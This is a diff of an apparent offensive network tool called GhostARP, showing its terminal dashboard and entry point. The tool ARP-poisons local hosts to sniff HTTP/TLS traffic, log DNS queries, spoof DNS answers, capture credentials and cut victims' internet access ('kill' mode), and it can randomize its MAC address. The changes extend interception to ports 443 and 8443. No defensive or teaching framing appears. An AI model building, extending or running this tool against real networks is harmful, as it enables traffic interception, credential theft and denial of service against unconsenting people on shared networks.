             title=hosts_title,
@@ -1221,48 +1372,48 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         top_grid = Table.grid(padding=(0, 1), expand=True)
         top_grid.add_column(ratio=1)
         top_grid.add_column(ratio=1)
-        
+
         left_grid = Table.grid(padding=(0, 1), expand=True)
         left_grid.add_row(info_panel)
         left_grid.add_row(targets_panel)
-        
+
         top_grid.add_row(left_grid, hosts_panel)
 
         bar = Table.grid(padding=(0, 1), expand=True)
         bar.add_row(Text("Setup Config > ", style="bold cyan") + Text(inp.buf) + Text("▏", style="white"))
-        
+
         subtitle = (
             "Type: [white]add <ip|num>[/] | [white]del <ip|num|all>[/] | [white]set <iface|gw|mode> <val>[/] | [white]macspoof <on|off>[/]\n"
             "      [white]scan[/] | [bold green]start[/] | [bold red]quit[/]"
         )
-        
+
         return Panel(
             Group(top_grid, log_panel, bar),
-            title="[bold cyan]⚡ GHOSTARP v1.5 - Setup Mode ⚡[/]",
+            title="[bold cyan]⚡ GHOSTARP v1.6 - Setup Mode ⚡[/]",
             subtitle=subtitle,
             border_style="cyan"
         )
-        
+
     else:
         attack = attack_ref[0]
         if not attack:
             return Panel(Text("Mempersiapkan engine attack...", style="yellow"))
-            
+
         victims = attack.victims_snapshot()
         total_pkts = attack.total_packets
-        
+
         info = Table.grid(padding=(0, 2))
         info.add_column(style="red bold")
         info.add_column()
         info.add_row("Interface", f"[white]{state.iface}[/]  ([dim]{state.own_mac}[/])")
         info.add_row("Gateway IP", f"[white]{state.gateway_ip}[/]  ([dim]{state.gateway_mac}[/])")
-        
+
         mode_style = "red" if attack.mode == "kill" else "green"
         mode_desc = "MITM (Sniffing Active)" if attack.mode == "mitm" else "KILL (Internet Cut)"
         info.add_row("Mode", f"[bold {mode_style}]{mode_desc}[/]")
         info.add_row("Poisoning", "[bold red]POISONING ACTIVE[/]" if not attack.paused else "[yellow]PAUSED[/]")
         info.add_row("Uptime", f"[white]{fmt_uptime(time.time() - state.start_time)}[/]")
-        
+
         info_panel = Panel(info, title="[bold red]💀 Attack Status[/]", border_style="red", expand=True)
 
         stats = Table.grid(padding=(0, 2))
@@ -1270,8 +1421,8 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         stats.add_column(justify="right")
         stats.add_row("Paket ARP terkirim", f"[bold red]{total_pkts:,}[/]")
         stats.add_row("Target ter-poison", f"[yellow]{len(victims)}[/]")
-        stats.add_row("HTTP Sniffed", f"[green]{len(http):,}[/]")
-        stats.add_row("DNS Spoofed", f"[cyan]{len(attack.spoof_snapshot())}[/]")
+        stats.add_row("HTTP/TLS Sniffed", f"[green]{len(http):,}[/]")
+        stats.add_row("DNS Queries", f"[cyan]{len(dns):,}[/]")
         stats.add_row("Credentials Captured", f"[bold blink red]{creds}[/]")
         stats_panel = Panel(stats, title="[bold magenta]📊 Statistics[/]", border_style="magenta", expand=True)
 
@@ -1290,7 +1441,7 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         ht.add_column("IP Address", style="bold yellow")
         ht.add_column("MAC Address", style="cyan")
         ht.add_column("Status")
-        
+
         target_ips = {v.ip for v in victims}
         for i, (ip, mac) in enumerate(hosts[:HOSTS_DISPLAY_MAX]):
             if ip == state.gateway_ip:
@@ -1300,11 +1451,11 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
             else:
                 status = "[dim]available[/]"
             ht.add_row(str(i + 1), ip, mac, status)
-            
+
         hosts_title = f"[bold green]🔍 Discovered Hosts ({len(hosts)})[/]"
         if state.scanning:
             hosts_title += " [blink yellow](Scanning...)[/]"
-            
+
         hosts_panel = Panel(
             ht if hosts else Text("\n  Tidak ada host / Belum scan.\n  Ketik 'scan' untuk memindai jaringan.", style="dim italic"),
             title=hosts_title,
@@ -1312,17 +1463,33 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
             expand=True
         )
 
+        # HTTP/TLS intercepted panel
         http_table = Table(box=SIMPLE_HEAVY, header_style="bold cyan", expand=True)
         http_table.add_column("Waktu", style="dim", width=8)
         http_table.add_column("Source IP", style="bold yellow")
         http_table.add_column("Type/Method", width=12)
         http_table.add_column("Details")
-        
+
         for ts, src, method, url in http[-6:]:
             mstyle = "bold red" if method == "POST" else "green"
             http_table.add_row(ts, src, f"[{mstyle}]{method}[/]", url)
-            
-        sniff_panel = Panel(http_table, title=f"[bold cyan]🌐 Live Intercepted Traffic (Sniff Ports: {attack.sniff_ports})[/]", border_style="cyan", expand=True)
+
+        sniff_panel = Panel(http_table,
+                            title=f"[bold cyan]🌐 Live Intercepted Traffic (Ports: {','.join(map(str, attack.sniff_ports))})[/]",
+                            border_style="cyan", expand=True)
+
+        # DNS queries panel (FIX: sebelumnya dikumpulkan tapi tidak pernah ditampilkan)
+        dns_table = Table(box=SIMPLE_HEAVY, header_style="bold blue", expand=True)
+        dns_table.add_column("Waktu", style="dim", width=8)
+        dns_table.add_column("Source IP", style="bold yellow")
+        dns_table.add_column("Query", style="cyan")
+
+        for ts, src, qname in dns[-8:]:
+            dns_table.add_row(ts, src, qname)
+
+        dns_panel = Panel(dns_table,
+                          title="[bold blue]🔎 Live DNS Queries[/]",
+                          border_style="blue", expand=True)
 
         log_table = Table(box=SIMPLE_HEAVY, header_style="bold green", expand=True)
         log_table.add_column("Waktu", style="dim", width=8)
@@ -1335,24 +1502,29 @@ def build_dashboard(state: State, inp: InputState, attack_ref: List[Optional[Arp
         top_grid.add_column(ratio=1)
         top_grid.add_column(ratio=1)
         top_grid.add_column(ratio=1)
-        
+
         left_grid = Table.grid(padding=(0, 1), expand=True)
         left_grid.add_row(info_panel)
         left_grid.add_row(stats_panel)
-        
+
         top_grid.add_row(left_grid, targets_panel, hosts_panel)
+
+        mid_grid = Table.grid(padding=(0, 1), expand=True)
+        mid_grid.add_column(ratio=3)
+        mid_grid.add_column(ratio=2)
+        mid_grid.add_row(sniff_panel, dns_panel)
 
         bar = Table.grid(padding=(0, 1), expand=True)
         bar.add_row(Text("Attack Active > ", style="bold red") + Text(inp.buf) + Text("▏", style="red"))
-        
+
         subtitle = (
             "Type: [bold yellow]stop[/] | [white]pause[/] | [white]resume[/] | [white]mode <mitm|kill>[/] | [white]add <ip|num>[/] | [white]del <ip|num|all>[/]\n"
             "      [white]scan[/] | [white]dns add d=ip[/] | [white]dns del d[/] | [bold red]quit[/]"
         )
-        
+
         return Panel(
-            Group(top_grid, sniff_panel, log_panel, bar),
-            title="[bold blink red]💀 GHOSTARP v1.5 - ATTACK ACTIVE 💀[/]",
+            Group(top_grid, mid_grid, log_panel, bar),
+            title="[bold blink red]💀 GHOSTARP v1.6 - ATTACK ACTIVE 💀[/]",
             subtitle=subtitle,
             border_style="red"
         )
@@ -1381,11 +1553,11 @@ def main() -> int:
                     help="(mode kill) poison ke MAC mati 00:00:00:00:00:00 - murni DoS, sniff korban OFF")
     ap.add_argument("--dns-file", help="File DNS spoof: 'domain ip' atau 'domain=ip' per baris")
     ap.add_argument("--mac-spoof", action="store_true", help="Randomize MAC sebelum attack")
-    ap.add_argument("--sniff-ports", default="80,8080",
-                    help="Port HTTP yang di-sniff (default: 80,8080)")
+    ap.add_argument("--sniff-ports", default="80,443,8080,8443",
+                    help="Port yang di-sniff (default: 80,443,8080,8443)")
     ap.add_argument("--timeout", type=float, default=None,
                     help="Auto-stop setelah N detik (untuk automation)")
-    ap.add_argument("--version", action="version", version="GhostARP 1.5")
+    ap.add_argument("--version", action="version", version="GhostARP 1.6")
     args = ap.parse_args()
 
     # Logo and Root warning checks
@@ -1399,38 +1571,52 @@ def main() -> int:
         console.print("[red][!] Jalankan sebagai root: sudo python3 ghostarp.py[/]")
         return 1
 
+    if args.dead_mac and args.mode != "kill":
+        console.print("[yellow][!] --dead-mac hanya efektif di mode kill. Mode saat ini: mitm.[/]")
+
     # Initialize state
     state = State()
-    
-    # Resolve interface
+
+    # Parse sniff ports
+    try:
+        ports = [int(x) for x in args.sniff_ports.split(",") if x.strip().isdigit()]
+        if ports:
+            state.sniff_ports = sorted(set(ports))
+    except ValueError:
+        state.add_log("--sniff-ports tidak valid, pakai default.", "red")
+
+    # Resolve interface: prioritas = CLI -> pemilik default route -> iface up pertama
     ifaces = list_up_interfaces()
     iface = args.iface
     if iface and iface in ifaces:
         state.iface = iface
-    elif ifaces:
-        state.iface = ifaces[0]
     else:
-        state.iface = "eth0"
-        
+        state.iface = default_route_iface() or (ifaces[0] if ifaces else "eth0")
+
     state.own_ip = get_ip(state.iface)
     state.own_mac = get_mac(state.iface)
     state.net = get_network(state.iface)
     state._orig_mac = state.own_mac
-    
+
+    if state.own_ip in ("", "0.0.0.0", "127.0.0.1"):
+        console.print(f"[red][!] Interface {state.iface} tidak punya IP valid ({state.own_ip}). "
+                      f"Gunakan -i <interface> atau 'set iface' di dashboard.[/]")
+
     # Resolve gateway IP
-    state.gateway_ip = args.gateway or get_default_gateway() or "192.168.1.1"
+    state.gateway_ip = args.gateway or get_default_gateway(state.iface) or "192.168.1.1"
     state.gateway_mac = ""  # Resolves in background
-    
+
     # Configure mode & options
     state.mode = args.mode or "mitm"
     state.dead_mac = args.dead_mac
     state.mac_spoof = args.mac_spoof
-    
+
     # Parse DNS file
     if args.dns_file:
         state.dns_file = args.dns_file
         state.dns_spoof_map = load_spoof_map(path=args.dns_file)
-        
+        console.print(f"[green][*] DNS spoof map dimuat: {len(state.dns_spoof_map)} domain[/]")
+
     # Pre-populated targets
     if args.target or args.targets_file:
         state.victims = parse_targets_cli(args.target, args.targets_file, state.iface)
@@ -1444,7 +1630,7 @@ def main() -> int:
     attack_ref: List[Optional[ArpSpoof]] = [None]
     stop_event = threading.Event()
     inp = InputState()
-    
+
     # Auto-start attack if targets are explicitly pre-loaded via CLI
     if args.target or args.targets_file:
         handle_cmd(state, "start", attack_ref, stop_event)
@@ -1452,8 +1638,11 @@ def main() -> int:
     if args.timeout:
         threading.Timer(args.timeout, stop_event.set).start()
         state.add_log(f"Auto-stop set to {args.timeout} seconds.", "yellow")
-        
-    signal.signal(signal.SIGTERM, lambda s, f: stop_event.set())
+
+    try:
+        signal.signal(signal.SIGTERM, lambda s, f: stop_event.set())
+    except Exception:
+        pass
 
     try:
         # Run live dashboard thread
@@ -1463,7 +1652,7 @@ def main() -> int:
             daemon=True
         )
         dash_thread.start()
-        
+
         # Read commands on the main thread (cbreak raw reader)
         if sys.stdin.isatty():
             _reader_loop(state, stop_event, inp, attack_ref)
@@ -1478,12 +1667,11 @@ def main() -> int:
         _restore_termios()
         if 'dash_thread' in locals():
             dash_thread.join(timeout=2.0)
-            
-        # Clean up active attack
+
+        # Clean up active attack (halt_and_restore: stop -> join poison -> restore)
         if attack_ref[0]:
-            attack_ref[0].stop.set()
-            attack_ref[0].restore()
-            
+            attack_ref[0].halt_and_restore()
+
         # Restore MAC address
         orig_mac = state._orig_mac
         current_mac = get_mac(state.iface)
@@ -1493,7 +1681,7 @@ def main() -> int:
                 console.print(f"[green][*] MAC interface dipulihkan ke {orig_mac}[/]")
             except Exception:
                 console.print(f"[red][!] Gagal restore MAC interface[/]")
-                
+
         # Restore forwarding
         if hasattr(state, '_orig_fwd'):
             set_ip_forward(state._orig_fwd == "1")
@@ -1506,13 +1694,13 @@ def main() -> int:
             f"[green]Attack selesai.[/]\n"
             f"Mode            : {state.mode.upper()}\n"
             f"Target(s)       : {len(vs)}\n{summary_lines}\n"
-            f"HTTP ter-sniff  : {len(state.http)}\n"
-            f"DNS ter-spoof   : {len(state.dns)}\n"
+            f"HTTP/TLS ter-sniff : {len(state.http)}\n"
+            f"DNS query terlihat : {len(state.dns)}\n"
             f"Kredensial      : [bold red]{creds}[/]\n"
             f"[dim]ARP cache semua target & gateway sudah dikembalikan.[/]",
             title="[bold cyan]Ringkasan[/]", border_style="cyan"
         ))
-        
+
     return 0
 
 
